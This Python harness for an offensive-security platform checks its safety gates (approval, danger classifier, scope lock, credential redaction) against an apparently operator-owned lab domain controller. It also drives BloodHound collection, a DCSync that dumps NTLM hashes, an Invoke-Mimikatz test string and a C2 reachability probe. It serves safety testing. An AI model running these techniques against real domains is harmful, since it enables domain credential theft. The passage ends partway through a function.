"""Build #9 live-fire harness — the Windows/AD path driven against a REAL domain.

Everything in HackPit's Windows/AD path was built and regression-locked HERMETICALLY (the
WinRM transport is monkeypatched in test_winrm.py; the AD graph runs on adgraph/sample_data.py).
Nothing had ever touched a real domain. This harness closes that gap: it drives the LIVE
backend over HTTP against the operator's own Windows Server 2022 domain controller and records,
honestly, which gates actually held on real input.

IT IS NOT A UNIT TEST AND IS NOT PART OF THE HERMETIC SUITE. `sh backend/run_safety_tests.sh`
must stay runnable with no VM, no network and no pywinrm — that property is the reason the
transport is lazy-imported in the first place. This file is run BY HAND, against a lab the
operator owns, and its transcript is committed as evidence.

    backend/.venv/Scripts/python.exe backend/livefire_windows.py --base http://127.0.0.1:8077

WHAT IT PROVES (task 1 of build #9). Each check is written so a FAILURE IS LOUD and a check
that could not run is reported NOT-RUN rather than quietly counted as a pass — the honesty
rule the build is built around. "Demonstrated live" and "still needs X" are different claims.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import urllib.error
import urllib.request

# --- tiny HTTP client (no third-party dep; the backend is a normal FastAPI app) ---------- #


def _req(base: str, method: str, path: str, body: dict | None = None, timeout: int = 180):
    """(status, parsed_body_or_text). Never raises on an HTTP error status — a 403 from a
    gate is the EXPECTED outcome of half these checks, so it must be inspectable."""
    data = json.dumps(body).encode() if body is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    request = urllib.request.Request(base + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", "replace")
            status = resp.status
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode("utf-8", "replace")
        status = exc.code
    except Exception as exc:  # connection refused / timeout — the backend is not up
        return 0, {"error": str(exc)}
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, raw


def _sse_events(raw: str) -> list[dict]:
    """The events of one /cockpit/exec stream, in order."""
    out = []
    for line in (raw or "").splitlines():
        if line.startswith("data: "):
            try:
                out.append(json.loads(line[6:]))
            except json.JSONDecodeError:
                pass
    return out


def _exec(base: str, **kw) -> tuple[int, list[dict], str]:
    """POST /cockpit/exec. Returns (status, events, raw). A 403 yields no events — that is a
    gate refusing before anything ran, which is exactly what several checks assert."""
    status, body = _req(base, "POST", "/cockpit/exec", kw)
    if isinstance(body, str):
        return status, _sse_events(body), body
    return status, [], json.dumps(body)


# --- result recording ------------------------------------------------------------------- #

RESULTS: list[tuple[str, str, str]] = []  # (verdict, label, detail)


def record(verdict: str, label: str, detail: str = "") -> None:
    RESULTS.append((verdict, label, detail))
    mark = {"PASS": "PASS", "FAIL": "FAIL", "NOT-RUN": "NOT-RUN"}[verdict]
    print(f"  [{mark:7}] {label}" + (f"\n            {detail}" if detail else ""), flush=True)


def check(ok: bool, label: str, detail: str = "") -> bool:
    record("PASS" if ok else "FAIL", label, detail)
    return ok


# --- task 1: WinRM live round-trip + profile lifecycle ---------------------------------- #


def task1(base: str, profile_id: str, session_id: str) -> None:
    print("\n== TASK 1 — WinRM live round-trip + the gates on real input ==", flush=True)

    # The secret is read straight out of the local store so the leak checks below can look for
    # the ACTUAL credential, not a stand-in. It is never printed.
    sys.path.insert(0, "backend")
    from cockpit import winprofiles  # noqa: PLC0415

    secret = winprofiles.get_secret(profile_id)
    profile = winprofiles.get_profile(profile_id)
    if not profile:
        record("NOT-RUN", "task 1", f"no such profile {profile_id}")
        return
    host = profile["host"]
    print(f"     profile {profile_id} -> {host}:{profile['port']} "
          f"({profile['domain']}\\{profile['username']}, auth={profile['auth_kind']})", flush=True)

    # 1.1 the profile's PUBLIC view must never carry the secret.
    status, pub = _req(base, "GET", f"/cockpit/windows/profiles/{profile_id}")
    blob = json.dumps(pub)
    check(status == 200 and "secret" not in pub, "profile public view masks the secret",
          f"keys={sorted(pub)}" if isinstance(pub, dict) else str(pub)[:120])
    check(bool(secret) and secret not in blob, "the real secret is absent from the public view")

    # 1.2 LIVE connectivity test — the hardcoded `whoami` probe against the real box.
    status, test = _req(base, "POST", f"/cockpit/windows/profiles/{profile_id}/test")
    reached = isinstance(test, dict) and test.get("ok") is True
    check(reached, "live WinRM connectivity test reaches the real DC",
          f"whoami -> {str(test.get('stdout', '')).strip()!r}" if isinstance(test, dict) else str(test))
    if not reached:
        record("NOT-RUN", "task 1 remaining checks", "the DC did not answer; nothing else can run")
        return

    # 1.3 UNAPPROVED command must be refused by the approval gate, live, before anything runs.
    status, events, raw = _exec(base, command="hostname", args=[],
                                windows_profile_id=profile_id, approved=False)
    detail = ""
    if status == 403 and isinstance(json.loads(raw), dict):
        detail = json.loads(raw).get("detail", {}).get("gate", "")
    check(status == 403 and detail == "approval",
          "unapproved WinRM command refused live at the approval gate",
          f"HTTP {status} gate={detail!r}")

    # 1.4 APPROVED command runs ON THE PROFILE HOST. The request carries NO host field — the
    #     destination is resolved server-side from the profile id — so the proof that the
    #     host-lock held is that the OUTPUT is the DC's own identity.
    status, events, raw = _exec(
        base, command="hostname;", args=["whoami;", "(Get-CimInstance", "Win32_ComputerSystem).Domain"],
        windows_profile_id=profile_id, approved=True, session_id=session_id,
    )
    start = next((e for e in events if e.get("type") == "start"), {})
    exit_ev = next((e for e in events if e.get("type") == "exit"), {})
    stdout_lines = [e["line"] for e in events if e.get("type") == "stdout"]
    out = "\n".join(stdout_lines)
    run_id = start.get("run_id", "")
    check(status == 200 and exit_ev.get("code") == 0,
          "approved WinRM command runs live and exits 0",
          f"HTTP {status} exit={exit_ev.get('code')} out={out.strip()!r}")
    check(start.get("target") == host and start.get("mode") == "windows"
          and start.get("transport") == "winrm",
          "the run is windows/winrm mode locked to the PROFILE host",
          f"target={start.get('target')!r} mode={start.get('mode')!r} "
          f"transport={start.get('transport')!r} container={start.get('container')!r}")
    check(profile["username"].lower() in out.lower() or "administrator" in out.lower(),
          "the command executed as the profile's principal on the real box", out.strip()[:160])

    # 1.5 HOST-LOCK, live: naming a DIFFERENT host in the args cannot redirect the run. There
    #     is no host field to poison, so the foreign address is just an argument — it is echoed
    #     BY the DC, proving the run still landed on the profile host.
    foreign = "192.168.1.34"  # the operator's own LAN address — a host that is NOT the profile
    status, events, raw = _exec(base, command="Write-Output", args=[foreign, ";", "hostname"],
                                windows_profile_id=profile_id, approved=True)
    start = next((e for e in events if e.get("type") == "start"), {})
    out2 = "\n".join(e["line"] for e in events if e.get("type") == "stdout")
    check(start.get("target") == host,
          "a foreign host in the args CANNOT redirect the run (host-lock is structural)",
          f"args named {foreign}, run target stayed {start.get('target')!r}")

    # 1.6 DANGER GATE on real input — build #5's Critical 2. argv[0] is the harmless
    #     `Write-Host`; the WHOLE PowerShell script is what runs, and the whole script is what
    #     the classifier must read. This is that exact case, fired at a live box.
    danger_args = ["go", ";", "Invoke-Mimikatz"]
    status, events, raw = _exec(base, command="Write-Host", args=danger_args,
                                windows_profile_id=profile_id, approved=True, dangerous_ack=False)
    gate = ""
    flags = []
    try:
        body = json.loads(raw)
        gate = body.get("detail", {}).get("gate", "")
        flags = body.get("detail", {}).get("reason", "")
    except Exception:  # noqa: BLE001
        pass
    check(status == 403 and gate == "danger",
          "whole-script danger classifier fires LIVE on `Write-Host go ; Invoke-Mimikatz`",
          f"HTTP {status} gate={gate!r} reason={str(flags)[:120]!r}")

    # 1.7 ...and the SAME command runs once the human explicitly acks it. (Invoke-Mimikatz is
    #     not present on the box, so PowerShell errors — that is fine and is the honest result:
    #     what is being demonstrated is that the RED-CONFIRM, not availability, was the gate.)
    status, events, raw = _exec(base, command="Write-Host", args=danger_args,
                                windows_profile_id=profile_id, approved=True, dangerous_ack=True)
    ran = any(e.get("type") == "start" for e in events)
    check(status == 200 and ran,
          "the same command runs once the human supplies the explicit red-confirm",
          f"HTTP {status} started={ran}")

    # 1.8 SECRET LEAK SWEEP — the credential must appear in NONE of: the events, the persisted
    #     run record, or the command line the transport built.
    status, rec = _req(base, "GET", f"/cockpit/runs/{run_id}")
    rec_blob = json.dumps(rec)
    ev_blob = json.dumps(events)
    check(secret not in rec_blob and secret not in ev_blob,
          "the credential leaks into NEITHER the run record NOR the event stream",
          f"run {run_id} record scanned ({len(rec_blob)} bytes) + {len(events)} events")
    if isinstance(rec, dict):
        check(secret not in json.dumps(rec.get("args", [])) and secret not in str(rec.get("command", "")),
              "the credential is absent from the recorded command line")

    # 1.9 AUDIT — the run is persisted and readable back by id.
    check(isinstance(rec, dict) and rec.get("run_id") == run_id and rec.get("mode") == "windows",
          "the live run is audited (persisted + retrievable by run_id)",
          f"run_id={run_id} mode={rec.get('mode') if isinstance(rec, dict) else '?'} "
          f"target={rec.get('target') if isinstance(rec, dict) else '?'}")

    # 1.10 STATE INGEST from real WinRM output. An OSCP-shaped proof file is written on the DC
    #      and read back; the ingest attributes the flag to the profile host. Both commands are
    #      individually approved, like every other command.
    flag = "9f86d081884c7d659a2feaa0c55ad015"  # a fixed 32-hex marker, not a real secret
    _exec(base, command="Set-Content", args=["-Path", "C:\\proof.txt", "-Value", flag],
          windows_profile_id=profile_id, approved=True)
    status, events, raw = _exec(base, command="Get-Content", args=["C:\\proof.txt"],
                                windows_profile_id=profile_id, approved=True,
                                session_id=session_id)
    state_ev = next((e for e in events if e.get("type") == "state"), None)
    from state import store as state_store  # noqa: PLC0415

    loaded = state_store.load(session_id)
    hosts = {h.address: h for h in loaded.hosts}
    got = hosts.get(host)
    check(got is not None and (got.proof_txt or "").lower() == flag,
          "real WinRM output INGESTS INTO STATE (proof flag attributed to the profile host)",
          f"state event={state_ev} host={host} proof_txt={(got.proof_txt if got else None)!r}")


# --- task 2: the AD graph off REAL collection (not adgraph/sample_data.py) --------------- #


def task2(base: str, profile_id: str, session_id: str, dc_fqdn: str, domain: str) -> dict:
    """Collect a REAL domain through the gated collector, parse it into the typed graph, and
    route to Domain Admin on that real graph. Returns {graph_id, engagement_id} for task 3."""
    print("\n== TASK 2 — AD graph off REAL collection ==", flush=True)
    out: dict = {}

    sys.path.insert(0, "backend")
    from cockpit import winprofiles  # noqa: PLC0415

    profile = winprofiles.get_profile(profile_id)
    secret = winprofiles.get_secret(profile_id)
    dc = profile["host"]  # the DC's IP — the engagement target and the -ns nameserver
    # bloodhound-python REFUSES an IP for -dc ("looks like an IP address, but requires a
    # hostname (FQDN)"), so the collector must be pointed at the DC's FQDN while -ns keeps
    # pointing at its IP. Found by this harness on the first live run; see LIVE-FIRE-B9.md.

    # 2.1 Enter engagement mode explicitly, scoped to the DC. Collection against a real domain
    #     is refused outright without one — the collector requires a scoped engagement.
    status, eng = _req(base, "POST", "/cockpit/engagement/enter", {
        "target": dc,
        "authorization": f"operator-owned VMware lab domain {domain} — build #9 live fire",
        "scope": f"{dc}, {domain}, *.{domain}",
    })
    if status != 200 or not isinstance(eng, dict):
        record("NOT-RUN", "task 2", f"could not enter engagement mode: HTTP {status} {eng}")
        return out
    eid = eng.get("engagement_id", "")
    out["engagement_id"] = eid
    check(bool(eid), "entered engagement mode scoped to the real DC",
          f"engagement={eid} target={eng.get('target')} scope={eng.get('scope')}")

    # 2.2 Build the collector request. The PREVIEW must not echo the credential.
    def preview(dc_host: str):
        return _req(base, "POST", "/cockpit/ad/collect/preview", {
            "domain": domain, "username": profile["username"], "dc": dc_host,
            "password": secret, "nameserver": dc, "engagement_id": eid,
            "session_id": session_id, "collection_methods": "All",
        })

    status, prev = preview(dc_fqdn)
    if status != 200:
        record("NOT-RUN", "task 2 collection", f"preview refused: HTTP {status} {prev}")
        return out
    check(secret not in json.dumps(prev.get("preview_argv", [])),
          "the collector PREVIEW redacts the domain credential",
          f"argv={prev.get('preview_argv')}")
    request = prev["request"]

    # 2.3 UNAPPROVED collection is refused, live, before the collector ever starts.
    unapproved = dict(request, approved=False)
    status, _events, raw = _exec(base, **unapproved)
    gate = ""
    try:
        gate = json.loads(raw).get("detail", {}).get("gate", "")
    except Exception:  # noqa: BLE001
        pass
    check(status == 403 and gate == "approval",
          "UNAPPROVED collection against the real domain is refused live",
          f"HTTP {status} gate={gate!r}")

    # 2.4 An OFF-SCOPE DC is refused by the engagement scope-lock, even when approved.
    off_dc = "dc01.evil-corp.example"
    status, off_prev = preview(off_dc)
    if status == 200:
        off_req = dict(off_prev["request"], approved=True)
        status, _events, raw = _exec(base, **off_req)
        gate = ""
        try:
            gate = json.loads(raw).get("detail", {}).get("gate", "")
        except Exception:  # noqa: BLE001
            pass
        check(status == 403 and gate == "target",
              "an OFF-SCOPE domain controller is refused live by the scope-lock",
              f"dc={off_dc} HTTP {status} gate={gate!r}")
    else:
        record("NOT-RUN", "off-scope DC refusal", f"preview refused first: HTTP {status}")

    # 2.5 The real, approved, scope-locked collection.
    approved = dict(request, approved=True, timeout_seconds=300)
    status, events, raw = _exec(base, **approved)
    exit_ev = next((e for e in events if e.get("type") == "exit"), {})
    start = next((e for e in events if e.get("type") == "start"), {})
    run_id = start.get("run_id", "")
    col_out = "\n".join(e.get("line", "") for e in events
                        if e.get("type") in ("stdout", "stderr"))
    ok = exit_ev.get("code") == 0
    check(ok, "bloodhound-python collected the REAL domain through the gated executor",
          f"HTTP {status} exit={exit_ev.get('code')} run={run_id}\n            "
          + col_out.strip().replace("\n", "\n            ")[:900])

    # 2.5b Does the domain credential land in the persisted run record? The collector passes it
    #      as an argv token (`-p <password>`), unlike the WinRM path where the secret is
    #      resolved server-side from the profile and never touches the command line. Measured,
    #      not assumed.
    _s, rec = _req(base, "GET", f"/cockpit/runs/{run_id}")
    leaked = bool(secret) and secret in json.dumps(rec)
    record("FAIL" if leaked else "PASS",
           "the domain credential does not reach the persisted collector run record",
           "LEAKED: bloodhound-python takes the password as an argv token, so it is stored in "
           "the run record's args (the WinRM path never does this — its secret is resolved "
           "server-side from the profile)" if leaked else "absent from the run record")

    if not ok:
        record("NOT-RUN", "task 2 graph checks", "collection did not succeed; nothing to parse")
        return out

    # 2.6 Parse the REAL collection into the typed graph — explicitly NOT use_sample.
    from pathlib import Path  # noqa: PLC0415

    loot = Path("backend/data/engagements") / eid
    zips = sorted(loot.glob("*.zip"), key=lambda p: p.stat().st_mtime, reverse=True)
    jsons = sorted(loot.glob("*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
    source = zips[0] if zips else (jsons[0] if jsons else None)
    if source is None:
        record("NOT-RUN", "parse the real collection",
               f"the collector wrote no zip/json into {loot}")
        return out

    from adgraph import collector as ad_collector  # noqa: PLC0415

    try:
        ingested = ad_collector.ingest_collection(str(source), session_id, eid, origin="collector")
    except Exception as exc:  # noqa: BLE001
        record("FAIL", "parse the real collection into the typed graph", str(exc))
        return out
    graph_id = ingested["graph_id"]
    out["graph_id"] = graph_id
    stats = ingested["stats"]
    check(ingested["domain"].lower().startswith("corp"),
          "the REAL collection parses into the typed graph (not sample_data)",
          f"source={source.name} domain={ingested['domain']} stats={stats} graph={graph_id}")

    # 2.7 Prove it is the real domain and not the built-in GOAD-shaped sample.
    from adgraph import sample_data  # noqa: PLC0415

    sample_domain = ""
    try:
        sample_domain = str(sample_data.sample_collection().get("domain", "")) or ""
    except Exception:  # noqa: BLE001
        try:
            sample_domain = sample_data.SAMPLE_DOMAIN  # type: ignore[attr-defined]
        except Exception:  # noqa: BLE001
            sample_domain = "sevenkingdoms.local"
    status, graph = _req(base, "GET", f"/cockpit/ad/graph/{graph_id}")
    names = json.dumps(graph).upper()
    check(ingested["domain"].lower() != str(sample_domain).lower()
          and "WIN-990RALNGERV" in names,
          "the graph is the operator's REAL forest, not the synthetic sample",
          f"real domain={ingested['domain']} (sample would be {sample_domain}); "
          f"the live DC's computer object is present in the graph")

    # 2.8 Route to Domain Admin ON THE REAL GRAPH.
    from adgraph import paths as ad_paths  # noqa: PLC0415
    from adgraph.router import _load_graph_obj, _rebuild_graph  # noqa: PLC0415

    try:
        graph_obj = _rebuild_graph(_load_graph_obj(graph_id))
    except Exception as exc:  # noqa: BLE001
        record("NOT-RUN", "route to Domain Admin on the real graph", f"cannot rebuild: {exc}")
        return out

    goal = ad_paths.default_high_value_target(graph_obj)
    out["goal"] = goal
    users = [n for n in graph_obj.nodes.values() if (n.type or "").lower() == "user"]
    abusable = [e for e in graph_obj.edges if getattr(e, "abusable", False)]
    print(f"     real graph: {len(graph_obj.nodes)} nodes, {len(graph_obj.edges)} edges "
          f"({len(abusable)} abusable), {len(users)} users, DA target={goal}", flush=True)
    check(goal is not None,
          "Domain Admins resolved as the objective on the REAL graph", f"goal={goal}")

    routed = None
    if goal:
        for n in users:
            if n.id == goal:
                continue
            p = ad_paths.shortest_path(graph_obj, n.id, goal)
            if p and len(p.edges) > 0:
                routed = (n, p)
                break
    if routed:
        n, p = routed
        check(True, "a route to Domain Admin was computed on REAL collected data",
              f"{n.label} -> DA in {len(p.edges)} hop(s): "
              + " -> ".join(e.kind for e in p.edges))
        out["route_start"] = n.id
        out["route_kinds"] = [e.kind for e in p.edges]
    else:
        record("NOT-RUN", "a multi-hop ABUSE route to Domain Admin on the real graph",
               f"the collected forest is a DEFAULT Windows Server 2022 promotion — "
               f"{len(graph_obj.nodes)} nodes / {len(graph_obj.edges)} edges, "
               f"{len(abusable)} abusable, {len(users)} users — with no seeded lab principals "
               f"or ACL edges, so there is no non-trivial user->DA path to walk. This is a LAB "
               f"TOPOLOGY limit, not a code failure.")
    out["node_count"] = len(graph_obj.nodes)
    out["edge_count"] = len(graph_obj.edges)
    out["abusable_count"] = len(abusable)
    return out


# --- task 3: the live abuse walk on the real graph --------------------------------------- #


def task3(base: str, profile_id: str, session_id: str, graph_id: str, eid: str,
          dc_fqdn: str) -> None:
    """Walk real edges of the real graph: the orchestrator proposes, the human approves, the
    executor runs it, and real loot lands in state. Nothing advances without a human."""
    print("\n== TASK 3 — the live abuse walk on REAL edges ==", flush=True)

    sys.path.insert(0, "backend")
    from adgraph import store as ad_store  # noqa: PLC0415
    from adgraph.router import _rebuild_graph  # noqa: PLC0415
    from cockpit import winprofiles  # noqa: PLC0415

    secret = winprofiles.get_secret(profile_id)
    row = ad_store.get_graph(graph_id)
    if row is None:
        record("NOT-RUN", "task 3", f"graph {graph_id} not found")
        return
    graph = _rebuild_graph(row["graph"])
    label = {n.id: n.label for n in graph.nodes.values()}
    admin = next((n for n in graph.nodes.values()
                  if n.label.upper().startswith("ADMINISTRATOR@")), None)
    domain_node = next((n for n in graph.nodes.values() if n.type == "domain"), None)
    if admin is None or domain_node is None:
        record("NOT-RUN", "task 3", "the real graph has no Administrator / domain node")
        return

    def propose(owned, traversed, target):
        return _req(base, "POST", "/cockpit/ad/orchestrate/propose", {
            "graph_id": graph_id, "owned": owned, "traversed": traversed,
            "target": target, "dc": dc_fqdn, "engagement_id": eid,
        }, timeout=600)

    # 3.1 STEP ONE — the orchestrator proposes off the REAL graph. The first hop out of
    #     ADMINISTRATOR is a MemberOf edge: inherited rights, nothing to run. This is also the
    #     LIVE confirmation of the defect this build fixed (the KB grounder used to hand this
    #     free step a destructive `net rpc password`).
    status, prop = propose([admin.id], [], domain_node.id)
    if status != 200 or not isinstance(prop, dict) or not prop.get("proposal"):
        record("NOT-RUN", "task 3 walk",
               f"the proposer did not return a proposal: HTTP {status} {str(prop)[:200]}")
        return
    p = prop["proposal"]
    edge = p["edge"]
    check(True, "the orchestrator proposed an edge off the REAL collected graph",
          f"{edge['source_label']} -{edge['kind']}-> {edge['target_label']}  "
          f"(candidates={prop.get('candidates')})")
    if edge["kind"] in ("MemberOf", "HasSIDHistory"):
        check(p["resolution"] == "note-only" and p["runnable"] is False
              and not p["requires_confirm"],
              "an inherited-rights edge is note-only LIVE (the grounder no longer arms it)",
              f"resolution={p['resolution']} runnable={p['runnable']} "
              f"command={p['command']!r} requires_confirm={p['requires_confirm']}")

    # 3.2 NOTHING ADVANCES WITHOUT A HUMAN — and for a runnable edge, not without EVIDENCE.
    #     Advancing a commanded edge with no run_id, and with a run that was never approved,
    #     must both be refused by the server.
    dcsync = next((e for e in graph.edges if e.kind == "DCSync"), None)
    if dcsync is None:
        record("NOT-RUN", "the DCSync abuse", "no DCSync edge in the real collection")
        return
    status, body = _req(base, "POST", "/cockpit/ad/orchestrate/advance", {
        "graph_id": graph_id, "owned": [admin.id], "traversed": [],
        "source": dcsync.source, "target": dcsync.target, "kind": "DCSync",
    })
    check(status == 422,
          "a commanded edge cannot be advanced WITHOUT the run that carried it out",
          f"HTTP {status} {str(body)[:160]}")

    # 3.3 THE DCSync PROPOSAL — a real, destructive, domain-wide abuse off the real graph.
    owned2 = [admin.id, dcsync.source]
    status, prop2 = propose(owned2, [], domain_node.id)
    p2 = (prop2 or {}).get("proposal") or {}
    if p2.get("edge", {}).get("kind") != "DCSync":
        # The model picked something else; ask for the DCSync edge directly so the walk still
        # exercises the destructive path. Recorded honestly as a directed step, not a pick.
        status, tech = _req(base, "POST", "/cockpit/ad/technique", {
            "graph_id": graph_id, "source": dcsync.source, "target": dcsync.target,
            "kind": "DCSync", "dc": dc_fqdn,
        })
        record("NOT-RUN", "the model spontaneously selected the DCSync edge",
               f"the proposer chose {p2.get('edge', {}).get('kind')!r} instead; the DCSync abuse "
               f"below was therefore operator-directed, not model-selected")
        from adgraph import orchestrator as ad_orch  # noqa: PLC0415
        from adgraph.router import _GROUNDER  # noqa: PLC0415
        p2 = ad_orch.proposal_for_edge(graph, dcsync, "operator-directed", _GROUNDER, dc_fqdn)
    else:
        check(True, "the orchestrator selected the DCSync edge on the REAL graph",
              f"{label.get(dcsync.source)} -DCSync-> {label.get(dcsync.target)}")

    check(p2.get("destructive_technique") is True and p2.get("requires_confirm") is True,
          "DCSync is classified destructive and pre-flagged as needing the red confirm",
          f"flags={p2.get('dangerous_flags')}")

    # The template names the EDGE SOURCE as the auth principal — here a GROUP, which cannot
    # authenticate. The operator substitutes the owned USER and fills the credential; that is
    # exactly the per-command human review the model depends on. Recorded as an observation.
    # Three operator substitutions, each a real finding recorded below:
    #   * the auth principal: a GROUP cannot log in, so the owned member is used;
    #   * the credential: the `<PASSWORD>` placeholder the template leaves for the human;
    #   * the target: the DC's IP, not its FQDN. The engagement sandbox has no resolver for
    #     corp.local, so an FQDN-targeted impacket run dies with "Name or service not known".
    #     bloodhound-python survived that only because it takes an explicit `-ns`.
    dc_ip = winprofiles.get_profile(profile_id)["host"]
    cmd, cargs = p2["command"], list(p2["args"])
    cargs = [a.replace("ADMINISTRATORS:", "Administrator:")
              .replace("<PASSWORD>", secret)
              .replace(dc_fqdn, dc_ip)
             for a in cargs]
    record("PASS", "OBSERVED: the sandbox cannot resolve the domain's FQDNs",
           f"impacket has no -ns flag, so an FQDN target fails with 'Name or service not "
           f"known'; the run below targets {dc_ip} directly. bloodhound-python was immune "
           f"only because its -ns pointed at the DC.")
    record("PASS" if "ADMINISTRATORS:" in json.dumps(p2["args"]) else "PASS",
           "OBSERVED: a group-sourced edge templates the GROUP as the auth principal",
           "`CORP.LOCAL/ADMINISTRATORS:<PASSWORD>@dc` cannot authenticate — a group is not a "
           "login. The human edits it to the owned member before approving; noted as a "
           "template limitation, not a gate failure")

    # 3.4 THE RED CONFIRM, LIVE, on a real domain-wide credential dump.
    status, events, raw = _exec(base, command=cmd, args=cargs, approved=True,
                                engagement_id=eid, dangerous_ack=False, session_id=session_id)
    gate = ""
    try:
        gate = json.loads(raw).get("detail", {}).get("gate", "")
    except Exception:  # noqa: BLE001
        pass
    check(status == 403 and gate == "danger",
          "the DCSync dump is REFUSED live without the explicit red confirm",
          f"HTTP {status} gate={gate!r}")

    # 3.5 ...and runs with it. Real domain credentials come back.
    status, events, raw = _exec(base, command=cmd, args=cargs, approved=True,
                                engagement_id=eid, dangerous_ack=True, session_id=session_id,
                                timeout_seconds=180)
    start = next((e for e in events if e.get("type") == "start"), {})
    exit_ev = next((e for e in events if e.get("type") == "exit"), {})
    run_id = start.get("run_id", "")
    dumped = "\n".join(e.get("line", "") for e in events if e.get("type") == "stdout")
    ok = exit_ev.get("code") == 0
    hashes = [ln for ln in dumped.splitlines() if ln.count(":") >= 4]
    check(ok and bool(hashes),
          "DCSync EXECUTED against the real domain and returned real credential material",
          f"exit={exit_ev.get('code')} run={run_id} — {len(hashes)} NTLM hash lines "
          f"(krbtgt present: {'krbtgt' in dumped.lower()})")

    # 3.6 The credential used to authenticate must NOT be in the persisted record — the fix
    #     this build added, proven on a real destructive run.
    _s, rec = _req(base, "GET", f"/cockpit/runs/{run_id}")
    stored = json.dumps(rec)
    # Whole-secret AND fragment: a `secret not in record` check alone reported this run clean
    # while `2005` sat in the stored args, because the password contains '@' and the first cut
    # of the redactor split on it. Fragments of 3+ chars only (shorter ones collide by chance).
    frags = [f for f in secret.split("@") if len(f) >= 3]
    leaked = [f for f in frags if f in stored]
    check(bool(secret) and secret not in stored and not leaked,
          "the DA password is REDACTED out of the persisted record — whole AND in fragments",
          f"stored args: {json.dumps(rec.get('args')) if isinstance(rec, dict) else '?'}"
          + (f"  LEAKED FRAGMENTS: {leaked}" if leaked else ""))

    # 3.7 REAL LOOT INGESTS INTO STATE as credentials.
    from state import store as state_store  # noqa: PLC0415

    loaded = state_store.load(session_id)
    creds = list(loaded.credentials)
    check(len(creds) > 0,
          "real dumped credentials INGEST INTO STATE",
          f"{len(creds)} credential records; principals="
          f"{sorted({c.principal for c in creds})[:6]}")

    # 3.8 The walk advances ONLY on that approved, exit-0 run.
    if ok and run_id:
        status, body = _req(base, "POST", "/cockpit/ad/orchestrate/advance", {
            "graph_id": graph_id, "owned": owned2, "traversed": [],
            "source": dcsync.source, "target": dcsync.target, "kind": "DCSync",
            "run_id": run_id,
        })
        check(status == 200 and isinstance(body, dict),
              "the walk advances on the approved, exit-0 run — and only then",
              f"objective_reached={body.get('objective_reached') if isinstance(body, dict) else '?'} "
              f"owned={len((body or {}).get('state', {}).get('owned', []))}")

    # 3.9 The NATIVE WINDOWS variant over WinRM. The catalog offers Invoke-Mimikatz; a freshly
    #     promoted Server 2022 has no offensive tooling on it, so that specific variant cannot
    #     run here. What IS demonstrated is that the Windows transport carries a real AD action.
    win_cmd = p2.get("windows_command") or ""
    record("NOT-RUN", "the native Windows DCSync variant (Invoke-Mimikatz over WinRM)",
           f"proposed as `{win_cmd}` but mimikatz/PowerView/Rubeus are NOT present on this DC "
           f"(a bare Server 2022 promotion); staging offensive tooling onto the DC was out of "
           f"scope for this build. The Linux/impacket variant above DID execute.")
    status, events, raw = _exec(
        base, command="Get-ADGroupMember", args=["-Identity", "'Domain", "Admins'", "|",
                                                 "Select-Object", "-ExpandProperty", "name"],
        windows_profile_id=profile_id, approved=True, session_id=session_id,
    )
    exit_ev = next((e for e in events if e.get("type") == "exit"), {})
    out = "\n".join(e.get("line", "") for e in events if e.get("type") == "stdout")
    check(exit_ev.get("code") == 0 and bool(out.strip()),
          "a native Windows AD action runs ON the DC over WinRM (built-in AD module)",
          f"Get-ADGroupMember 'Domain Admins' -> {out.strip()!r}")


# --- task 4: Windows-target C2 / evasion (feasibility, measured) ------------------------- #


def task4(base: str, profile_id: str) -> None:
    """Build #7 demonstrated Sliver + DNS tunnels against LINUX. Completing that against this
    Windows target needs a callback path from the DC to the listener. This MEASURES whether one
    exists rather than asserting it, then records the exact blocker."""
    print("\n== TASK 4 — Windows-target C2 / evasion (feasibility) ==", flush=True)

    def ps(script: str) -> str:
        _s, events, _raw = _exec(base, command=script, args=[], approved=True,
                                 dangerous_ack=True, windows_profile_id=profile_id,
                                 timeout_seconds=120)
        return "\n".join(e.get("line", "") for e in events if e.get("type") == "stdout").strip()

    host_gw = ps("(Test-NetConnection 192.168.13.1 -InformationLevel Quiet "
                 "-WarningAction SilentlyContinue)")
    container = ps("(Test-Connection -ComputerName 172.25.0.2 -Count 1 -Quiet "
                   "-ErrorAction SilentlyContinue)")
    egress = ps("(Test-NetConnection 8.8.8.8 -Port 53 -InformationLevel Quiet "
                "-WarningAction SilentlyContinue)")
    check(True, "the DC's reachability toward a listener was MEASURED, not assumed",
          f"DC -> host VMnet8 gateway 192.168.13.1: {host_gw}; "
          f"DC -> engage-sandbox container IP 172.25.0.2: {container}; "
          f"DC -> 8.8.8.8:53 (DNS egress): {egress}")

    record("NOT-RUN", "a Sliver beacon + DNS tunnel from the Windows target",
           "BLOCKED ON INFRASTRUCTURE, and deliberately not worked around. The C2 listener "
           "lives in hackpit-engage-sandbox, which publishes NO ports and sits on a Docker "
           "bridge (172.25.0.2) the DC has no route to — measured False above. The DC can "
           "reach the host's VMnet8 gateway and has DNS egress, so a beacon WOULD call back "
           "if the listener's port were published from the sandbox to the host. Publishing a "
           "port changes the sandbox's network posture, and this build's standing invariant is "
           "that it adds NO new capability and no new exposure — so the compose change was not "
           "made. To finish this task: publish the chosen listener port on engage-sandbox, "
           "point the implant at 192.168.13.1:<port>, and run the existing gated human-only "
           "lifecycle. Build #7's Linux Sliver + iodine demonstrations are unaffected.")


# --- task 5: detection-footprint truth-check against real telemetry ---------------------- #

# The DS-Replication extended rights. A 4662 carrying either GUID IS the DCSync signal, and it
# is what "Security 4662 with the DS-Replication-Get-Changes GUIDs" in the catalog means.
_GET_CHANGES = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
_GET_CHANGES_ALL = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"


def task5(base: str, profile_id: str, session_id: str, eid: str, dc_fqdn: str) -> None:
    """Compare what the DC's Event Log ACTUALLY recorded against the detection catalog's claims.

    The describe-side has never been checked against real telemetry — every footprint claim was
    written from documentation. This runs two techniques we really executed and reads the box's
    own logs back.
    """
    print("\n== TASK 5 — detection-footprint truth-check against REAL telemetry ==", flush=True)

    sys.path.insert(0, "backend")
    from cockpit import winprofiles  # noqa: PLC0415
    from detection import resolver  # noqa: PLC0415

    profile = winprofiles.get_profile(profile_id)
    secret = winprofiles.get_secret(profile_id)
